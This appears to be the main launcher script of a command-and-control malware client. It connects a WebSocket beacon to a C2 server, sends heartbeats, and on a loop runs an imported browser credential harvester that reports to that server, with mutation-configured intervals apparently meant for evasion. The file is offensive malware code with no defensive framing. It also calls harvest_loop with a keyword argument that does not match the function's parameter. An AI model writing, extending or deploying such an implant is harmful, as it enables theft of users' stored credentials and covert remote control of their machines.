import asyncio
import uuid
import os
import sys

sys.path.insert(0, os.path.join(os.path.dirname(__file__), "..", ".."))

from src.c2_client.beacon import C2WebSocketBeacon
from src.c2_client.payloads.browser_credential_harvester import run_harvester


async def heartbeat_loop(beacon: C2WebSocketBeacon, base_interval: int = 30):
    """Send periodic heartbeats, respecting mutation-configured intervals."""
    while True:
        try:
            interval = beacon._active_mutation.get("beacon_interval", base_interval)
            await asyncio.sleep(interval)
            await beacon.send({
                "type": "heartbeat",
                "node_id": beacon.node_id,
                "watermark": beacon.watermark,
            })
        except Exception:
            pass


async def harvest_loop(beacon: C2WebSocketBeacon, base_interval: int = 120):
    """Periodically run the full credential harvester, respecting mutation intervals."""
    while True:
        try:
            interval = beacon._active_mutation.get("harvest_interval", base_interval)
            await asyncio.sleep(interval)
            await run_harvester(beacon.node_id, beacon.c2_url, beacon.watermark)
        except Exception as e:
            print(f"[!] Harvester error: {e}")
            await asyncio.sleep(30)


async def main():
    C2_URL = os.getenv("C2_URL", "http://localhost:8000")
    NODE_ID = f"node_{uuid.uuid4().hex[:8]}"
    WATERMARK = uuid.uuid4().hex[:8]

    print(f"[*] Initializing C2 Beacon...")
    print(f"[*] Node ID: {NODE_ID}")
    print(f"[*] C2 URL: {C2_URL}")

    beacon = C2WebSocketBeacon(
        c2_url=C2_URL,
        node_id=NODE_ID,
        watermark=WATERMARK,
    )

    try:
        connect_task = asyncio.create_task(beacon.connect())
        heartbeat_task = asyncio.create_task(heartbeat_loop(beacon))
        harvest_task = asyncio.create_task(harvest_loop(beacon, interval=120))

        await asyncio.gather(connect_task, heartbeat_task, harvest_task)
    except KeyboardInterrupt:
        beacon.disconnect()
    except Exception as e:
        print(f"[!] Fatal error: {e}")

if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        pass
